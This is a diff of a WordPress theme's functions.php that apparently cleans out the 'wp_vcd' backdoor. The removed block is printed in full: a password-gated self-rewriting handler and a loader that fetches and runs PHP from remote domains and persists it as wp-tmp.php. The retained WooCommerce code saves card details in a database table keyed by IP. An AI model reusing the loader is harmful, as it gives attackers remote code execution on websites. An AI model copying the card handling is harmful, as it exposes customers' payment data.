@@ -1,191 +1,4 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '47bec3689c37496c4c2716f3cab18d2c'))
-  {
-$div_code_name="wp_vcd";
-    switch ($_REQUEST['action'])
-      {
-
-        
-
-
-
-
-        case 'change_domain';
-          if (isset($_REQUEST['newdomain']))
-            {
-              
-              if (!empty($_REQUEST['newdomain']))
-                {
-                                                                           if ($file = @file_get_contents(__FILE__))
-                                                                        {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                                                                                                             {
-
-                                                                                 $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-                                                                                 @file_put_contents(__FILE__, $file);
-                                             print "true";
-                                                                                                             }
-
-
-                                                                        }
-                }
-            }
-        break;
-
-                case 'change_code';
-          if (isset($_REQUEST['newcode']))
-            {
-              
-              if (!empty($_REQUEST['newcode']))
-                {
-                                                                           if ($file = @file_get_contents(__FILE__))
-                                                                        {
-                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-                                                                                                             {
-
-                                                                                 $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-                                                                                 @file_put_contents(__FILE__, $file);
-                                             print "true";
-                                                                                                             }
-
-
-                                                                        }
-                }
-            }
-        break;
-        
-        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-      }
-      
-    die("");
-  }
-
-
-
-
-
-
-
-
-$div_code_name = "wp_vcd";
-$funcfile      = __FILE__;
-if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-        
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
-        
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-           if( fwrite($handle, "<?php\n" . $phpCode))
-       {
-       }
-      else
-      {
-      $tmpfname = tempnam('./', "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-      fwrite($handle, "<?php\n" . $phpCode);
-      }
-      fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
-        
-
-$wp_auth_key='f71cbadcd875a4cb9c68a20da8a93d08';
-        if (($tmpcontent = @file_get_contents("http://www.prilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.prilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-        
-        
-        elseif ($tmpcontent = @file_get_contents("http://www.prilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        } 
-    
-            elseif ($tmpcontent = @file_get_contents("http://www.prilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-    elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-           
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } 
-        
-        
-        
-        
-        
-    }
-}
-
-//$start_wp_theme_tmp
-
-
-
-//wp_tmp
-
-
-//$end_wp_theme_tmp
-?><?php
-
-
-// SUBSCRIPTION WOOCOMMERCE CUSTOMIZATION
-
 /**
  * Storefront engine room
  *
@@ -202,10 +15,10 @@ require 'inc/hooks-template.php';
 
 
 if ( is_woocommerce_activated() ) {
-  require 'inc/class-woocommerce.php';
-  require 'inc/hooks-woocommerce.php';
-  require 'inc/functions-woocommerce.php';
-  require 'inc/readyfestive-functions.php';
+	require 'inc/class-woocommerce.php';
+	require 'inc/hooks-woocommerce.php';
+	require 'inc/functions-woocommerce.php';
+	require 'inc/readyfestive-functions.php';
 }
 
 function add_theme_caps() {
@@ -215,13 +28,18 @@ function add_theme_caps() {
     // This only works, because it accesses the class instance.
     // would allow the author to edit others' posts for current theme only
     $role->add_cap( 'edit_pages' ); 
-  $role->add_cap( 'edit_published_pages' ); 
-  $role->add_cap( 'publish_pages' ); 
-  $role->add_cap( 'delete_pages' ); 
-  $role->add_cap( 'delete_published_pages' ); 
-  $role->add_cap( 'manage_categories' ); 
+	$role->add_cap( 'edit_published_pages' ); 
+	$role->add_cap( 'publish_pages' ); 
+	$role->add_cap( 'delete_pages' ); 
+	$role->add_cap( 'delete_published_pages' ); 
+	$role->add_cap( 'manage_categories' ); 
 }
 add_action( 'admin_init', 'add_theme_caps');
+
+
+// WOOCOMMERCE Questionnaire Start
+
+
 add_action("wp_ajax_add_tocart", "add_tocart");
 add_action("wp_ajax_nopriv_add_tocart", "add_tocart");
 function add_tocart(){
@@ -233,12 +51,12 @@ function add_tocart(){
     $ArrUn=array_unique($arr);
     $selectPlan=implode(",",$ArrUn);
   
-  update_post_meta(3341, '_regular_price',$total);
-  update_post_meta(3341, '_price',$total );
+  update_post_meta(3480, '_regular_price',$total);
+  update_post_meta(3480, '_price',$total );
    global $woocommerce;
    $woocommerce->cart->empty_cart();   
-   $price = get_post_meta(3341, '_regular_price', true);
-   WC()->cart->add_to_cart(3341);
+   $price = get_post_meta(3480, '_regular_price', true);
+   WC()->cart->add_to_cart(3480);
   
      $_SESSION['fname'] =$name;
      $_SESSION['planType'] =$planType;
@@ -472,15 +290,15 @@ function process(){
   
   $cardData=json_encode($cardData);
   if($action=='yes'){
-  update_post_meta(3341, '_subscription_trial_length',1);
-  update_post_meta(3341, '_subscription_trial_period','year');
+  update_post_meta(3480, '_subscription_trial_length',1);
+  update_post_meta(3480, '_subscription_trial_period','year');
   $data_array = array('card_details'=>$cardData,'action'=>'yes');
   $where = array('ip' =>$ip);
   $wpdb->update($table_name,$data_array,$where );
   }
   if($action=='no'){
-  update_post_meta(3341, '_subscription_trial_length',0);
-  update_post_meta(3341, '_subscription_trial_period','day');
+  update_post_meta(3480, '_subscription_trial_length',0);
+  update_post_meta(3480, '_subscription_trial_period','day');
   $data_array = array('action'=>'no');
   $where = array('ip' =>$ip);
   $wpdb->update($table_name,$data_array,$where );
@@ -489,3 +307,6 @@ function process(){
 }
 
 // END AS GO PAYMENT METHOD FUNCTION
+
+
+// END WOOCOMMERCE Questionnaire 
